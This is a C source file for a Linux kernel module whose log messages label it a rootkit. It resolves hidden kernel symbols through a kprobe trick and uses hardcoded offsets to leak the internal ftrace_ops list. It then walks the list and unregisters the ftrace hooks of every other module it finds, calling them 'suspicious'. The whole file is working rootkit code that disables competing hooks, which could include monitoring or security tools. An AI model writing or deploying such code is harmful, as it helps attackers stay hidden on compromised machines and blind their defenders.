//
// Created by sciver on 10/17/22.
//

#include "reveal_ftrace.h"
#include <linux/ftrace.h>
#include <linux/printk.h>
#include <linux/module.h>

//#define LIST_END_OFFSET 0x7ad125
//#define OPS_LIST_OFFSET 0x7ad0ed
#define LIST_END_OFFSET 0x1abc800
#define OPS_LIST_OFFSET 0x1abc7d0

/*
 * Traverse the ftrace_global_list, invoking all entries.  The reason that we
 * can use rcu_dereference_raw_check() is that elements removed from this list
 * are simply leaked, so there is no need to interact with a grace-period
 * mechanism.  The rcu_dereference_raw_check() calls are needed to handle
 * concurrent insertions into the ftrace_global_list.
 *
 * Silly Alpha and silly pointer-speculation compiler optimizations!
 */
#define do_for_each_ftrace_op(op, list)			\
	op = rcu_dereference_raw_check(list);			\
	do

/*
 * Optimized for just a single item in the list (as that is the normal case).
 */
#define while_for_each_ftrace_op(op)				\
	while (likely(op = rcu_dereference_raw_check((op)->next)) &&	\
	       unlikely((op) != ftrace_list_end_addr))

/*
 * On Linux kernels 5.7+, kallsyms_lookup_name() is no longer exported,
 * so we have to use kprobes to get the address.
 * Full credit to @f0lg0 for the idea.
 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
        .symbol_name = "kallsyms_lookup_name"
};
#endif

void reveal_ftrace(void) {
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    struct ftrace_rec_iter *iter;
    struct dyn_ftrace *rec;
    typedef struct ftrace_rec_iter *(* ftrace_rec_iter_start_t)(void);
    typedef struct ftrace_rec_iter *(* ftrace_rec_iter_next_t)(struct ftrace_rec_iter *iter);
    typedef struct dyn_ftrace *(* ftrace_rec_iter_record_t)(struct ftrace_rec_iter *iter);
    typedef int (* ftrace_test_record_t)(struct dyn_ftrace *rec, bool enable);
    typedef ftrace_func_t (* ftrace_ops_get_func_t)(struct ftrace_ops *ops);
//    typedef unsigned long (*ftrace_get_addr_new_t)(struct dyn_ftrace *rec);
//    typedef unsigned long (*ftrace_get_addr_curr_t)(struct dyn_ftrace *rec);
    typedef struct module *(*__module_address_t)(unsigned long addr);

    ftrace_rec_iter_start_t ftrace_rec_iter_start = (ftrace_rec_iter_start_t) kallsyms_lookup_name("ftrace_rec_iter_start");
    ftrace_rec_iter_next_t ftrace_rec_iter_next = (ftrace_rec_iter_next_t) kallsyms_lookup_name("ftrace_rec_iter_next");
    ftrace_rec_iter_record_t ftrace_rec_iter_record = (ftrace_rec_iter_record_t) kallsyms_lookup_name("ftrace_rec_iter_record");
    ftrace_ops_get_func_t ftrace_ops_get_func = (ftrace_ops_get_func_t) kallsyms_lookup_name("ftrace_ops_get_func");
//    ftrace_get_addr_new_t ftrace_get_addr_new = (ftrace_get_addr_new_t) kallsyms_lookup_name("ftrace_get_addr_new");
//    ftrace_get_addr_curr_t ftrace_get_addr_curr = (ftrace_get_addr_curr_t) kallsyms_lookup_name("ftrace_get_addr_curr");
    __module_address_t __module_address = (__module_address_t) kallsyms_lookup_name("__module_address");

    char buf[128];
    printk(KERN_DEBUG "rootkit: ftrace_rec_iter_start: %lx\n", (size_t)ftrace_rec_iter_start);
    printk(KERN_DEBUG "rootkit: ftrace_rec_iter_next: %lx\n", (size_t)ftrace_rec_iter_next);
    printk(KERN_DEBUG "rootkit: ftrace_rec_iter_record: %lx\n", (size_t)ftrace_rec_iter_record);
    // Iterate over all ftrace structs and print them
    for_ftrace_rec_iter(iter) {
        rec = ftrace_rec_iter_record(iter);
        if (rec->flags & FTRACE_FL_IPMODIFY) {
            sprint_symbol(buf, rec->ip);
            printk(KERN_DEBUG "ftrace_rec_iter_record: %lx %s, flags: %lx", rec->ip, buf, rec->flags);
        }
    }
    struct ftrace_ops *ftrace_list_end_addr = (struct ftrace_ops *)(LIST_END_OFFSET + ftrace_rec_iter_start);
    struct ftrace_ops **ftrace_ops_list_addr = (struct ftrace_ops **)(OPS_LIST_OFFSET + ftrace_rec_iter_start);
    struct ftrace_ops *ftrace_ops_list = *ftrace_ops_list_addr;
    struct ftrace_ops *op;

    printk(KERN_DEBUG "rootkit: ftrace_list_end_addr leak!: %lx\n", (size_t)ftrace_list_end_addr);
    printk(KERN_DEBUG "rootkit: ftrace_ops_list_addr leak!: %lx\n", (size_t)ftrace_ops_list_addr);
    printk(KERN_DEBUG "rootkit: ftrace_ops_list leak!: %lx\n", (size_t)ftrace_ops_list);
    do_for_each_ftrace_op(op, ftrace_ops_list) {
        ftrace_func_t func = ftrace_ops_get_func(op);
        printk(KERN_DEBUG "rootkit: ftrace_ops_list: %lx, %lx, %lx\n", (size_t)op, (size_t)func, (size_t)op->saved_func);
        struct module *mod = __module_address(op);
        if (mod) {
            printk(KERN_DEBUG "rootkit: find module: %s\n", mod->name);
        }
        if (mod && mod != THIS_MODULE) {
            printk(KERN_INFO "rootkit: suspicious module detected: %s\n", mod->name);
            printk(KERN_INFO "rootkit: suppressing it :)");
            unregister_ftrace_function(op);
        }
    } while_for_each_ftrace_op(op);
}